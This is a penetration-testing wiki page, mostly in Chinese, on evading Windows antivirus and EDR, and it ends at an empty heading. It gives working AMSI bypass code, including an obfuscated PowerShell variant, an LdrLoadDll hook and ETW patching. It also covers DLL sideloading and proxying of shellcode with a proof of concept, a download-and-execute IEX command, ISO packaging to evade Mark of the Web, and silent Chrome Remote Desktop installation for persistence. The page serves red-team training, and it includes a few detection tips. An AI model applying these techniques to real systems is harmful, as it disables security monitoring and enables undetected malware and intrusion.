# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**本页作者：** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于让 Windows Defender 停止工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个通过伪装成另一个 AV 来让 Windows Defender 停止工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

目前，AV 使用不同的方法来判断文件是否恶意：静态检测、动态分析，以及对于更高级的 EDRs，还会有行为分析。

### **Static detection**

静态检测通过在二进制或脚本中标记已知的恶意字符串或字节数组来实现，也会从文件本身提取信息（例如 file description、company name、digital signatures、icon、checksum 等）。这意味着使用已知的公共工具可能更容易被抓到，因为它们很可能已经被分析并被标记为恶意。有几种方法可以绕过这种检测：

- **Encryption**

如果你对二进制进行加密，AV 就无法检测到你的程序，但你需要某种 loader 在内存中解密并运行程序。

- **Obfuscation**

有时只需要更改二进制或脚本中的一些字符串就能通过 AV，但根据你要混淆的内容，这可能是一个耗时的工作。

- **Custom tooling**

如果你自己开发工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上把文件分成多个段，然后让 Defender 单独扫描每一段，这样可以准确告诉你二进制中被标记的字符串或字节是什么。

强烈建议你查看这个关于实用 AV Evasion 的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **Dynamic analysis**

动态分析是指 AV 在沙箱中运行你的二进制并观察是否有恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这一部分可能更难应对，但有一些方法可以用来规避沙箱。

- **Sleep before execution** 取决于实现方式，这可能是绕过 AV 动态分析的好方法。AV 的文件扫描时间通常很短以避免打断用户工作流，因此使用较长的 sleep 可以干扰二进制的分析。但问题是许多 AV 的沙箱可以根据实现直接跳过 sleep。
- **Checking machine's resources** 通常沙箱可用的资源很少（例如 < 2GB RAM），否则会拖慢用户机器。你也可以在这里发挥创意，例如检查 CPU 温度或风扇转速，并不是所有这些都会在沙箱中实现。
- **Machine-specific checks** 如果你想针对加入了 "contoso.local" 域的用户工作站，可以检查计算机的域是否匹配指定的域，如果不匹配就让程序退出。

事实证明，Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，所以你可以在你的 malware 引爆前检查计算机名，如果名字是 HAL9TH，说明你在 Defender 的沙箱内，这时就可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源： <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

以下是来自 [@mgeeky](https://twitter.com/mariuszbit) 关于对抗 Sandboxes 的一些非常好的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

如前所述，**公共工具**最终会被**检测到**，所以你应该问自己一个问题：

例如，如果你想转储 LSASS，**你真的必须使用 mimikatz 吗**？还是可以使用一个不那么出名但也能转储 LSASS 的其它项目？

正确的答案可能是后者。以 mimikatz 为例，它可能是、如果不是的话就是被 AVs 和 EDRs 标记最多的工具之一，虽然该项目本身很酷，但在与 AV 对抗时它也是个噩梦，所以为你要实现的目标寻找替代方案吧。

> [!TIP]
> 在修改你的 payload 以规避检测时，务必在 Defender 中**关闭自动样本提交**，并且请认真地**切勿将样本上传到 VirusTotal**。如果你想检查某个 AV 是否检测你的 payload，在一台 VM 上安装该 AV，尝试关闭自动样本提交，并在那里测试直到你对结果满意。

## EXEs vs DLLs

只要可能，总是**优先使用 DLLs 来规避**。根据我的经验，DLL 文件通常**被检测和分析的程度远低于 EXE**，因此在某些情况下（如果你的 payload 能以 DLL 形式运行）这是一个非常简单的避免检测的技巧。

正如下图所示，Havoc 的一个 DLL payload 在 antiscan.me 的检测率为 4/26，而 EXE payload 为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比：普通 Havoc EXE payload vs 普通 Havoc DLL</p></figcaption></figure>

下面我们将展示一些你可以在 DLL 文件上使用以提高隐蔽性的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，通过将受害应用程序和恶意 payload 放在一起达到目的。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 powershell script 来查找易受 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
该命令会输出位于 "C:\Program Files\\" 中易受 DLL hijacking 的程序列表以及它们尝试加载的 DLL 文件。

我强烈建议你 **自己探索 DLL Hijackable/Sideloadable programs**，如果正确实施，此技术相当隐蔽，但如果使用公开已知的 DLL Sideloadable programs，可能会很容易被发现。

仅仅放置一个与程序期望加载的名称相同的恶意 DLL 并不会运行你的 payload，因为程序期望该 DLL 内包含某些特定函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 将程序对代理（及恶意）DLL 的调用转发到原始 DLL，从而保留程序功能并能够处理 payload 的执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

我遵循的步骤如下：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们 2 个文件：一个 DLL 源代码模板，和原始重命名的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的检测率均为 0/26！我会称之为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，以及 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入地了解我们所讨论的内容。

### 滥用 Forwarded Exports (ForwardSideLoading)

Windows PE modules 可以导出实际上是 “forwarders” 的函数：导出条目不是指向代码，而是包含形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 会：

- 如果尚未加载，则加载 `TargetDll`
- 从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则它由受保护的 KnownDLLs 命名空间提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行转发解析的模块所在目录。

这就实现了一个间接的 sideloading 原语：找到一个将函数转发到非 KnownDLL 模块名的签名 DLL，然后将该签名 DLL 与一个名称完全等于转发目标模块且由攻击者控制的 DLL 放在同一目录。当调用该转发导出时，加载器会解析转发并从同一目录加载你的 DLL，执行你的 DllMain。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此按照常规搜索顺序解析。

PoC（复制粘贴）：
1) 将签名的系统 DLL 复制到可写的文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 将恶意的 `NCRYPTPROV.dll` 放在同一文件夹。一个最小的 `DllMain` 就足以获得代码执行；无需实现转发的函数来触发 `DllMain`。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（已签名）加载并列的 `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会跟随转发到 `NCRYPTPROV.SetAuditingInterface`
- 然后加载器从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，你会在 `DllMain` 已运行后才收到 "missing API" 错误

Hunting tips:
- 关注那些转发导出（forwarded exports），且目标模块不是 KnownDLL 的情况。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用如下工具枚举转发导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项: https://hexacorn.com/d/apis_fwd.txt

检测/防御建议:
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载已签名的 DLLs，随后从该目录加载具有相同基名的非-KnownDLLs
- 对类似于的进程/模块链发出告警：`rundll32.exe` → 非系统 `keyiso.dll` → `NCRYPTPROV.dll`（位于用户可写路径）
- 强制执行代码完整性策略（WDAC/AppLocker），并在应用程序目录中禁止写+执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个 payload toolkit，用于绕过 EDRs，使用 suspended processes、direct syscalls 和 alternative execution methods`

你可以使用 Freeze 以隐蔽方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 规避只是猫鼠游戏，今天可行的方法明天可能就会被检测到，所以不要仅依赖单一工具，尽可能尝试串联多种规避技术。

## AMSI（Anti-Malware Scan Interface）

AMSI 是为防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" 而创建的。最初，AV 只能扫描 **files on disk**，因此如果你能以某种方式将 payloads **directly in-memory** 执行，AV 就无法阻止，因为它没有足够的可见性。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它允许杀软通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上触发如下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是运行脚本的可执行文件路径，这个例子中是 powershell.exe

我们没有在磁盘上写入任何文件，但仍然因为 AMSI 在内存中被检测到。

此外，从 **.NET 4.8** 开始，C# 代码也会通过 AMSI 检查。这甚至会影响使用 `Assembly.Load(byte[])` 进行的内存加载执行。因此，如果想规避 AMSI，建议使用较低版本的 .NET（如 4.7.2 或更低）来进行内存执行。

有几种方式可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要对静态检测起作用，因此修改你尝试加载的脚本可能是规避检测的一个好方法。

然而，AMSI 具有对多层混淆脚本进行去混淆的能力，因此混淆是否有效取决于实现方式，有时并不是一个好选项。这使得规避变得不那么直接。不过有时只需更改几个变量名就能通过，所以这取决于被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将 DLL 注入到 powershell（也包括 cscript.exe、wscript.exe 等）进程来实现的，即使以非特权用户运行也可以很容易地对其进行篡改。由于 AMSI 实现中的这个缺陷，研究人员发现了多种绕过 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，Microsoft 随后开发了签名以防止其被广泛使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 powershell 代码即可使当前的 powershell 进程中的 AMSI 无效。当然这行代码本身会被 AMSI 标记，所以需要对其进行一些修改才能使用该技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 取得并修改过的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，一旦这篇文章发布，很可能会被标记，因此如果你的计划是保持不被发现，就不要发布任何代码。

**Memory Patching**

该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，涉及查找 amsi.dll 中的 "AmsiScanBuffer" 函数地址（负责扫描用户提供的输入），并将其覆盖为返回 E_INVALIDARG 的指令。这样，实际扫描的结果将返回 0，被解释为干净的结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的说明。

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. 一个健壮且与语言无关的绕过方法是对 `ntdll!LdrLoadDll` 放置用户模式钩子，在请求的模块是 `amsi.dll` 时返回错误。这样，AMSI 就永远不会加载，该进程也不会进行任何扫描。

实现概述（x64 C/C++ 伪代码）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意

- 在 PowerShell、WScript/CScript 及自定义加载器中都适用（任何会加载 AMSI 的情况）。
- 可与通过 stdin 提供脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`）配合使用，以避免长命令行痕迹。
- 在通过 LOLBins 执行的加载器中可见（例如，`regsvr32` 调用 `DllRegisterServer`）。

该工具 [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) 也会生成用于绕过 AMSI 的脚本。

**移除被检测到的签名**

你可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 的工具，从当前进程的内存中移除被检测到的 AMSI 签名。该工具通过扫描当前进程内存中的 AMSI 签名，然后用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**Use Powershell version 2**

如果你使用 PowerShell version 2，AMSI 不会被加载，因此你可以运行脚本而不被 AMSI 扫描。你可以这样做：
```bash
powershell.exe -version 2
```
## PS 日志

PowerShell logging 是一个功能，允许记录系统上执行的所有 PowerShell 命令。对于审计和故障排查很有用，但对想要规避检测的攻击者来说也可能是一个**问题**。

要绕过 PowerShell 日志记录，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：你可以使用工具比如 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 来实现。
- **Use Powershell version 2**：如果使用 PowerShell version 2，AMSI 将不会被加载，因此可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 启动一个没有防护的 powershell（这就是 Cobal Strike 的 `powerpick` 使用的方式）。


## 混淆

> [!TIP]
> 一些混淆技术依赖于加密数据，这会增加二进制的熵，从而更容易被 AVs 和 EDRs 检测到。对此要小心，或许只对代码中敏感或需要隐藏的特定部分应用加密。

### 反混淆 ConfuserEx 保护的 .NET 二进制

在分析使用 ConfuserEx 2（或商业分支）的恶意软件时，通常会遇到多层保护，阻止反编译器和沙箱。下面的工作流程能够可靠地**恢复接近原始的 IL**，之后可以在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  去除防篡改 – ConfuserEx 会加密每个 *method body* 并在 *module* 静态构造函数 (`<Module>.cctor`) 中解密。它还会修补 PE 校验和，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 来定位加密的元数据表，恢复 XOR 密钥并重写为干净的程序集：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个防篡改参数（`key0-key3`, `nameHash`, `internKey`），在构建自定义 unpacker 时可能有用。

2.  符号 / 控制流恢复 – 将 *clean* 文件交给 **de4dot-cex**（de4dot 的 ConfuserEx 感知分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
选项：
• `-p crx` – 选择 ConfuserEx 2 配置文件  
• de4dot 会撤销控制流平坦化，恢复原始的命名空间、类和变量名，并解密常量字符串。

3.  代理调用剥离 – ConfuserEx 用轻量包装器（即 *proxy calls*）替换直接的方法调用，以进一步破坏反编译。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，你应该会看到常见的 .NET API（如 `Convert.FromBase64String` 或 `AES.Create()`），而不是不透明的包装函数（`Class8.smethod_10` 等）。

4.  手动清理 – 在 dnSpy 中运行生成的二进制，搜索大型 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用来定位 *真实* 载荷。恶意软件通常将其作为 TLV 编码的字节数组存储并在 `<Module>.byte_0` 中初始化。

上述链可以在**不**需要运行恶意样本的情况下恢复执行流——在离线工作站上进行分析时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可作为 IOC 用来自动分类样本。

#### 单行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 混淆器**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目旨在提供 LLVM 编译套件的一个开源分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提高软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 展示了如何使用 `C++11/14` 在编译时生成混淆代码，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ 模板元编程框架添加一层混淆操作，使试图破解应用的人更难以分析。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够对多种 PE 文件进行混淆，包括: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意可执行文件的简单 metamorphic code 引擎。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个细粒度的代码混淆框架，针对 LLVM 支持的语言使用 ROP (return-oriented programming)。ROPfuscator 通过将常规指令转换为 ROP 链，在汇编级别对程序进行混淆，从而破坏我们对正常控制流的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode 并加载它们

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 需要注意，使用 **受信任的** 签名证书签署的可执行文件 **不会触发 SmartScreen**。

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志机制，允许应用程序和系统组件**记录事件**。然而，它也可被安全产品用来监控并检测恶意活动。

类似于 AMSI 被禁用（绕过）的方式，也可以让用户空间进程的 **`EtwEventWrite`** 函数在不记录任何事件的情况下立即返回。方法是在内存中修补该函数使其立即返回，从而有效地禁用该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 找到更多信息。


## C# Assembly Reflection

将 C# 二进制文件加载到内存中已经是一个成熟且常用的方法，仍然是运行 post-exploitation 工具而不被 AV 捕获的很好方式。

由于 payload 会直接加载到内存中而不触及磁盘，我们只需要担心为整个进程修补 AMSI 即可。

大多数 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) 已经提供了直接在内存中执行 C# assemblies 的能力，但有不同的实现方式：

- **Fork\&Run**

它涉及**生成一个新的牺牲进程（sacrificial process）**，将你的 post-exploitation 恶意代码注入到该新进程中，执行恶意代码，完成后终止该进程。此方法既有优点也有缺点。Fork and run 的好处是执行发生在我们的 Beacon implant 进程**之外**。这意味着如果我们的 post-exploitation 操作出错或被发现，我们的 implant 存活的**可能性会大得多**。缺点是更有可能被 **Behavioural Detections** 发现。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

该方法是将 post-exploitation 恶意代码注入到**其自身的进程**中。这样可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 执行出现问题，更可能**丢失你的 beacon**，因为可能导致进程崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想阅读更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell**加载 C# Assemblies，参考 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 所示，通过让受害机器访问由 Attacker Controlled SMB share 上提供的解释器环境，可以使用其他语言执行恶意代码。

通过允许访问 SMB 共享上的 Interpreter Binaries 和环境，你可以在受感染机器的内存中**以这些语言执行任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等语言，我们在**绕过静态签名**方面有更多灵活性。对这些语言中随机未混淆的反向 shell 脚本的测试已被证明是成功的。

## TokenStomping

Token stomping 是一种技术，允许攻击者**操纵访问令牌或像 EDR 或 AV 这样的安全产品**，使其权限降低，从而进程不会被终止，但也没有权限去检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程令牌的句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，在受害者 PC 上部署 Chrome Remote Desktop 然后利用它接管并维持持久性是很容易的：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI。
2. 在受害者机器上静默运行安装程序（需要管理员）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 回到 Chrome Remote Desktop 页面并点击下一步。向导会要求你授权；点击 Authorize 按钮继续。
4. 使用一些调整后的参数执行给定命令：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数允许在不使用 GUI 的情况下设置 PIN）。

## Advanced Evasion

Evasion 是一个非常复杂的主题，有时你必须在单一系统中考虑许多不同的遥测来源，因此在成熟环境中完全保持不被发现几乎不可能。

每个环境都会有其自身的强项和弱点。

我强烈建议你去观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以便入门更高级的 Evasion 技术。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于 Evasion in Depth 的另一个很棒的演讲。

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制的部分内容**，直到找出 Defender 认为恶意的那一部分并将其分离给你。\
另一个做同样事情的工具是 [**avred**](https://github.com/dobin/avred)，其在线服务位于 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

